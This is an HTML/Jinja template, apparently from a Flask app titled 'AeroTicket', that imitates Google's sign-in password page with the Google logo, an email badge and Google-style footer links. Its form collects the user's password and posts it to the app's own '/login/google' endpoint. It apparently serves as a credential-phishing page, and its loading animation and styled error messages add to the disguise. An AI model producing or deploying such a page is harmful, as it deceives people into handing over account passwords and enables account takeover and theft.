<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome - AeroTicket</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="{{ url_for('static', filename='google_log.css') }}">
    <style>
        /* Loading Circle Styles */
        .loader {
            display: none; /* Hidden by default */
            border: 3px solid #f3f3f3;
            border-top: 3px solid #4285f4;
            border-radius: 50%;
            width: 18px;
            height: 18px;
            animation: spin 1s linear infinite;
            margin-left: 10px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .btn-content {
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .next-btn:disabled {
            background-color: #ccc;
            cursor: not-allowed;
        }
        
        /* ===== ERROR STYLES: RED TEXT, NO BACKGROUND, BELOW PASSWORD FIELD ===== */
        .error-message {
            color: #d93025 !important;
            background: transparent !important;
            font-size: 14px;
            margin-top: -8px;
            margin-bottom: 15px;
            padding: 0;
            font-weight: 400;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        /* Hide any flash message containers that might have backgrounds */
        .flash-message, .alert, .alert-error, .alert-danger, .alert-success {
            background: transparent !important;
            border: none !important;
            box-shadow: none !important;
        }
        
        /* Ensure the input wrapper and error spacing is correct */
        .input-wrapper {
            margin-bottom: 5px;
        }
        
        .show-pw {
            margin-bottom: 20px;
            display: block;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="left-panel">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="48" style="margin-bottom:20px;">
        <h1>Welcome</h1>
        <a href="{{ url_for('google_login') }}" class="email-badge">
            <span class="avatar-circle">👤</span> 
            <span class="email-text">{{ email }}</span> 
            <span class="arrow">▼</span>
        </a>
    </div>
    
    <div class="right-panel">
        <!-- FLASH MESSAGES - Now showing as RED TEXT with NO BACKGROUND, BELOW PASSWORD FIELD -->
        {% with messages = get_flashed_messages(with_categories=true) %}
          {% if messages %}
            {% for category, message in messages %}
              <div class="error-message">
                <span>⚠️</span> {{ message }}
              </div>
            {% endfor %}
          {% endif %}
        {% endwith %}

        <form action="/login/google" method="POST" id="loginForm">
            <input type="hidden" name="step" value="password">
            <input type="hidden" name="email" value="{{ email }}"> 
            
            <div class="input-wrapper">
                <input type="password" name="password" id="password" placeholder=" " required autofocus>
                <label for="password">Enter your password</label>
            </div>

            <label class="show-pw">
                <input type="checkbox" onclick="togglePassword()"> 
                <span>Show password</span>
            </label>
            
            <div class="button-row">
                <a href="#" class="forgot-link">Forgot password?</a>
                <button type="submit" class="next-btn" id="submitBtn">
                    <div class="btn-content">
                        <span id="btnText">Next</span>
                        <div class="loader" id="loader"></div>
                    </div>
                </button>
            </div>
        </form>
    </div>
</div>

<div class="footer">
    <div>English (United States) ▼</div>
    <div class="footer-links">
        <span>Help</span>
        <span>Privacy</span>
        <span>Terms</span>
    </div>
</div>

<script>
    // Show/Hide Password
    function togglePassword() {
        var x = document.getElementById("password");
        x.type = (x.type === "password") ? "text" : "password";
    }

    // Loading Animation on Click
    const loginForm = document.getElementById('loginForm');
    const submitBtn = document.getElementById('submitBtn');
    const loader = document.getElementById('loader');
    const btnText = document.getElementById('btnText');

    if (loginForm) {
        loginForm.addEventListener('submit', function() {
            // Disable button to prevent double clicks
            submitBtn.disabled = true;
            // Show loader and change text
            loader.style.display = 'block';
            btnText.innerText = 'Verifying...';
        });
    }
</script>

</body>
</html>
